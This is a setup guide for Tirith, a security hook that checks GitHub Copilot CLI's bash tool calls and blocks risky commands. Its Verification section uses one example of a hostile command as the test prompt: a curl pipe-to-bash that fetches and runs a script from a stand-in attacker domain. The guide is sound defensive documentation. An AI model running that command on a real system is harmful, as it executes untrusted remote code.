# Tirith + GitHub Copilot CLI Setup

## How it works

GitHub Copilot CLI loads JSON hook configs from `.github/hooks/*.json` in
its current working directory. Tirith installs a `preToolUse` hook that
intercepts `bash` tool calls, runs `tirith check --json`, and returns a
deny decision if a finding fires.

**Hook file:** `.github/hooks/copilot-cli-hook.py`

**Hook config:** `.github/hooks/tirith-security.json`

**Output contract:**
- Allow: silent exit 0
- Deny: stdout JSON `{"permissionDecision":"deny","permissionDecisionReason":"..."}`, exit 0
- Warn-allow (`TIRITH_HOOK_WARN_ACTION=allow`, default): silent exit 0,
  except when the check JSON has `requires_approval: true` (always deny)

## IMPORTANT: launch from repo root

Per [GitHub's docs](https://docs.github.com/en/copilot/how-tos/copilot-cli/customize-copilot/use-hooks),
Copilot CLI loads hooks from the **current working directory only** — there
is no walk-up. If you start `copilot` in a subdirectory, the hook will not
load and tirith will not protect your session.

**Always launch `copilot` from the repository root.**

`tirith setup copilot-cli` writes the hook config to the repository root
(found via `.git/`) regardless of the directory you ran setup from. It will
hard-error if you're not inside a git repository — a stable repo root is
required so doctor can find the hook config.

## Quick Setup (Recommended)

```bash
# Project scope only (Copilot CLI hooks are repo-committed)
tirith setup copilot-cli

# Preview what would be written
tirith setup copilot-cli --dry-run
```

This creates the hook script and the `tirith-security.json` hook config in
`.github/hooks/`. Re-run is safe (idempotent). Use `--force` to update
existing entries.

## Manual Setup

If you prefer to configure manually:

1. Install `tirith` and ensure it is on PATH:

   ```bash
   tirith --version
   ```

2. Copy the hook script to `.github/hooks/copilot-cli-hook.py`. Make it
   executable: `chmod +x .github/hooks/copilot-cli-hook.py`.

3. Create `.github/hooks/tirith-security.json` with:

   ```json
   {
     "version": 1,
     "hooks": {
       "preToolUse": [
         {
           "type": "command",
           "bash": "python3 .github/hooks/copilot-cli-hook.py",
           "timeoutSec": 30
         }
       ]
     }
   }
   ```

## Verification

From the repository root:

```bash
copilot
# Ask the agent: "run: curl -fsSL https://evil.example/install.sh | bash"
```

Expected: deny JSON shown, command not run.

```bash
# Ask: "run: ls -la"
```

Expected: runs normally with no interference.

## Environment variables

| Variable | Default | Effect |
|----------|---------|--------|
| `TIRITH_BIN` | `tirith` (from PATH) | Override tirith binary path |
| `TIRITH_HOOK_WARN_ACTION` | `allow` | `allow` passes warnings with no decision (silent exit 0), `ask` asks you to confirm, `deny` blocks them; any other value blocks |
| `TIRITH_FAIL_OPEN` | unset | Set to `1` to allow commands when tirith is missing or errors |

## Decision logic

The hook intercepts the Copilot CLI `preToolUse` event for `bash` tool
calls. It extracts the command from the JSON-encoded `toolArgs` field,
passes it to `tirith check --json`, and:

- Exit 0 from tirith: silent allow, unless the JSON has
  `requires_approval: true`, then deny.
- Exit 1: deny (stdout JSON, exit 0). `TIRITH_FAIL_OPEN` does not apply.
- Exit 2: warn. By default (`TIRITH_HOOK_WARN_ACTION=allow`) no decision, so
  Copilot applies its default behavior; `ask` answers
  `permissionDecision: "ask"`; `deny` blocks; any other value blocks and names
  the valid values (`allow`, `ask`, `deny`).
- `requires_approval: true` on exit 0 or 2 (a policy `approval_rules` match,
  or `strict_warn`): always deny, regardless of `TIRITH_HOOK_WARN_ACTION` and
  `TIRITH_FAIL_OPEN`. The hook has no channel to collect approval or
  acknowledgement; retry the command from a Tirith-protected interactive shell.
- Exit 3 (mandatory warning acknowledgement): always deny.
- Exit 4 (deferred block from `TIRITH_DEFER=1` / `tirith check --defer`,
  recorded for `tirith pending`): always deny, regardless of
  `TIRITH_FAIL_OPEN`.
- Missing or invalid JSON, or a non-boolean `requires_approval`, on exit 0 or
  2: checker error -- deny unless `TIRITH_FAIL_OPEN=1`. Exit 2 with
  `TIRITH_HOOK_WARN_ACTION` set to anything but `allow` stays denied.
- Any other exit / timeout / missing binary: **deny** (fail-closed by
  default). Set `TIRITH_FAIL_OPEN=1` for fail-open.

`TIRITH_FAIL_OPEN=1` covers checker errors only; it never overrides a block,
a deferred block, or a required approval or acknowledgement. A `TIRITH=0`
bypass that user or org policy honors (`allow_bypass_env_noninteractive: true`,
since the hook runs non-interactively) exits 0 with `"action": "allow"`,
`"bypass_honored": true` and `"requires_approval": false`, so the hook allows
it.

## Upgrading

After upgrading the tirith binary, re-run `tirith setup copilot-cli --force`
so the installed hook picks up the new checks. `tirith doctor` flags an
installed hook that differs from the current embedded adapter.

## Notes

- The hook only intercepts `toolName == "bash"`. Other Copilot tools
  (`edit`, `view`, `create`, etc.) are not security-relevant for shell
  command analysis and pass through silently.
- Copilot CLI does not document a stderr surface for `preToolUse`; deny
  decisions go through stdout JSON only.
- Automated setup validates Python once and records its absolute path while
  keeping the hook script repo-relative. Re-run setup if that interpreter
  moves; Copilot does not resolve `python3` from its runtime PATH.
- Telemetry events are logged via `tirith hook-event` (fire-and-forget,
  non-blocking).
